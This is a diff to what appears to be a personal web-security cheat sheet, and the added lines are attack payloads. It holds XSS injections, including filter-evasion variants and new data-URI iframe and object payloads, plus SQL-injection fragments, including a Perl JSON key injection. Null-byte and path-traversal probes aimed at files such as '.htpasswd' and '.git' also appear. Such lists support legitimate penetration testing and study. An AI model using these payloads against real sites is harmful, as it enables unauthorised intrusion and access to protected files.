@@ -24,9 +24,13 @@ javascript:void(document.forms[0].p2.childNodes[1].innerText='<script>alert(docu
 <script>alert('XSS')</sciprt>
 "><script>alert(document.domain)</script>
 " onmouseover = " alert('\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x64\x6F\x6D\x61\x69\x6E')"
-"><script>alert(\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x64\x6F\x6D\x61\x69\x6E)</script>
+re"><script>alert(\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x64\x6F\x6D\x61\x69\x6E)</script>
 " onmouseover = " alert('\x58\x53\x53') "
 "/onmouseover="window['aler'+'t']('XS'+'S')">
+
+* data uri scheme
+<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+<object data="data:text/html,<script>alert('XSS2')</script>"></object>
 
 * space
 <style/onload    =    !-alert&#x28;document.domain&#x29;>
@@ -82,6 +86,9 @@ fuga' OORR '1
 5.1.73
 https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
 
+# perl json sqli
+{ "name" : "a", "a\") OR 1 #" : "a" }
+
 # Wire shark packete filter
 icmp.type == 8
 http.host contains google
@@ -109,3 +116,5 @@ view.php?file=../index.php
 .git
 sitemap.xml
 robots.txt
+%00
+.htpasswd%00
